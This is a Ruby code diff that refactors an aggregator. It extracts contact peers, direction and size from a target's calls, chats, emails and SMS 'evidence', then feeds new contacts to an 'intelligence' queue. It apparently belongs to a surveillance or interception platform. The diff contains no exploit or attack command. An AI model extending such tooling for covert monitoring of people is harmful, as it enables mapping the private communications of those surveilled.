@@ -20,8 +20,9 @@ class Processor
     loop do
       # get the first entry from the queue and mark it as processed to avoid
       # conflicts with multiple processors
-      if (entry = AggregatorQueue.where(flag: NotificationQueue::QUEUED).find_and_modify({"$set" => {flag: NotificationQueue::PROCESSED}}, new: false))
-        count = AggregatorQueue.where({flag: NotificationQueue::QUEUED}).count()
+      if (queued = AggregatorQueue.get_queued)
+        entry = queued.first
+        count = queued.last
         trace :info, "#{count} evidence to be processed in queue"
         process entry
       else
@@ -38,10 +39,8 @@ class Processor
 
     trace :info, "Processing #{ev.type} for target #{target.name}"
 
-    data = []
-
     # extract peer(s) from call, mail, chat, sms
-    data = extract_data(ev) if ['call', 'chat', 'message'].include? ev.type
+    data = extract_data(ev)
 
     trace :debug, ev.data.inspect
 
@@ -64,6 +63,12 @@ class Processor
       # find the existing aggregate or create a new one
       agg = Aggregate.collection_class(entry['target_id']).find_or_create_by(params)
 
+      # if it's new: add the entry to the summary and notify the intelligence
+      if agg.count == 0
+        Aggregate.collection_class(entry['target_id']).add_to_summary(type, datum[:peer])
+        IntelligenceQueue.add(entry['target_id'], agg._id, :aggregate) if LicenseManager.instance.check :intelligence
+      end
+
       # we are sure we have the object persisted in the db
       # so we have to perform an atomic operation because we have multiple aggregator working concurrently
       agg.inc(:count, 1)
@@ -84,76 +89,109 @@ class Processor
 
     case ev.type
       when 'call'
-        if ev.data['peer']
-          # old call format
-          # multiple peers creates multiple entries
-          ev.data['peer'].split(',').each do |peer|
-            data << {:peer => peer.strip, :versus => ev.data['incoming'] == 1 ? :in : :out, :type => ev.data['program'].downcase, :size => ev.data['duration'].to_i}
-          end
-        else
-          # new call format
-          if ev.data['incoming'] == 1
-            data << {:peer => ev.data['from'], :versus => :in, :type => ev.data['program'].downcase, :size => ev.data['duration'].to_i}
-          else
-            # multiple rcpts creates multiple entries
-            ev.data['rcpt'].split(',').each do |rcpt|
-              data << {:peer => rcpt.strip, :versus => :out, :type => ev.data['program'].downcase, :size => ev.data['duration'].to_i}
-            end
-          end
-        end
+        data += extract_call(ev)
+
       when 'chat'
-        if ev.data['peer']
-          # old chat format
-          # multiple rcpts creates multiple entries
-          ev.data['peer'].split(',').each do |peer|
-            data << {:peer => peer.strip, :versus => nil, :type => ev.data['program'].downcase, :size => ev.data['content'].length}
-          end
-        else
-          # new chat format
-          if ev.data['incoming'] == 1
-            # special case when the agent is not able to get the account but only display_name
-            return if ev.data['from'].eql? ''
-            data << {:peer => ev.data['from'], :versus => :in, :type => ev.data['program'].downcase, :size => ev.data['content'].length}
-          else
-            # special case when the agent is not able to get the account but only display_name
-            return if ev.data['rcpt'].eql? ''
-            # multiple rcpts creates multiple entries
-            ev.data['rcpt'].split(',').each do |rcpt|
-              data << {:peer => rcpt.strip, :versus => :out, :type => ev.data['program'].downcase, :size => ev.data['content'].length}
-            end
-          end
-        end
+        data += extract_chat(ev)
+
       when 'message'
-        # multiple rcpts creates multiple entries
-        if ev.data['type'] == :mail
+        data += extract_message(ev)
 
-          # don't aggregate draft mails
-          return data if ev.data['draft']
-
-          if ev.data['incoming'] == 1
-            #extract email from string "Ask Me" <ask@me.it>
-            from = ev.data['from'].scan(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/i).first
-            data << {:peer => from, :versus => :in, :type => ev.data['type'].downcase, :size => ev.data['body'].length}
-          else
-            ev.data['rcpt'].split(',').each do |rcpt|
-              #extract email from string "Ask Me" <ask@me.it>
-              to = rcpt.strip.scan(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/i).first
-              data << {:peer => to, :versus => :out, :type => ev.data['type'].downcase, :size => ev.data['body'].length}
-            end
-          end
-        else
-          if ev.data['incoming'] == 1
-            data << {:peer => ev.data['from'], :versus => :in, :type => ev.data['type'].downcase, :size => ev.data['content'].length}
-          else
-            ev.data['rcpt'].split(',').each do |rcpt|
-              data << {:peer => rcpt.strip, :versus => :out, :type => ev.data['type'].downcase, :size => ev.data['content'].length}
-            end
-          end
-        end
     end
 
     return data
   end
+
+  def self.extract_chat(ev)
+    data = []
+
+    # TODO: remove old chat format (after 9.0.0)
+    if ev.data['peer']
+      # multiple rcpts creates multiple entries
+      ev.data['peer'].split(',').each do |peer|
+        data << {:peer => peer.strip.downcase, :versus => nil, :type => ev.data['program'].downcase, :size => ev.data['content'].length}
+      end
+
+      return data
+    end
+
+    # new chat format
+    if ev.data['incoming'] == 1
+      # special case when the agent is not able to get the account but only display_name
+      return [] if ev.data['from'].eql? ''
+      data << {:peer => ev.data['from'].strip.downcase, :versus => :in, :type => ev.data['program'].downcase, :size => ev.data['content'].length}
+    elsif ev.data['incoming'] == 0
+      # special case when the agent is not able to get the account but only display_name
+      return [] if ev.data['rcpt'].eql? ''
+      # multiple rcpts creates multiple entries
+      ev.data['rcpt'].split(',').each do |rcpt|
+        data << {:peer => rcpt.strip.downcase, :versus => :out, :type => ev.data['program'].downcase, :size => ev.data['content'].length}
+      end
+    end
+
+    return data
+  end
+
+  def self.extract_call(ev)
+    data = []
+
+    # TODO: remove old call format (after 9.0.0)
+    if ev.data['peer']
+      # multiple peers creates multiple entries
+      ev.data['peer'].split(',').each do |peer|
+        data << {:peer => peer.strip.downcase, :versus => ev.data['incoming'] == 1 ? :in : :out, :type => ev.data['program'].downcase, :size => ev.data['duration'].to_i}
+      end
+
+      return data
+    end
+
+    # new call format
+    if ev.data['incoming'] == 1
+      data << {:peer => ev.data['from'].strip.downcase, :versus => :in, :type => ev.data['program'].downcase, :size => ev.data['duration'].to_i}
+    elsif ev.data['incoming'] == 0
+      # multiple rcpts creates multiple entries
+      ev.data['rcpt'].split(',').each do |rcpt|
+        data << {:peer => rcpt.strip.downcase, :versus => :out, :type => ev.data['program'].downcase, :size => ev.data['duration'].to_i}
+      end
+    end
+
+    return data
+  end
+
+  def self.extract_message(ev)
+    data = []
+
+    # MAIL message
+    if ev.data['type'] == :mail
+
+      # don't aggregate draft mails
+      return [] if ev.data['draft']
+
+      if ev.data['incoming'] == 1
+        #extract email from string "Ask Me" <ask@me.it>
+        from = ev.data['from'].scan(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/i).first
+        data << {:peer => from.downcase, :versus => :in, :type => :mail, :size => ev.data['body'].length}
+      elsif ev.data['incoming'] == 0
+        ev.data['rcpt'].split(',').each do |rcpt|
+          #extract email from string "Ask Me" <ask@me.it>
+          to = rcpt.strip.scan(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/i).first
+          data << {:peer => to.downcase, :versus => :out, :type => :mail, :size => ev.data['body'].length}
+        end
+      end
+    # SMS and MMS
+    else
+      if ev.data['incoming'] == 1
+        data << {:peer => ev.data['from'].strip.downcase, :versus => :in, :type => ev.data['type'].downcase, :size => ev.data['content'].length}
+      elsif ev.data['incoming'] == 0
+        ev.data['rcpt'].split(',').each do |rcpt|
+          data << {:peer => rcpt.strip.downcase, :versus => :out, :type => ev.data['type'].downcase, :size => ev.data['content'].length}
+        end
+      end
+    end
+
+    return data
+  end
+
 
 end
 
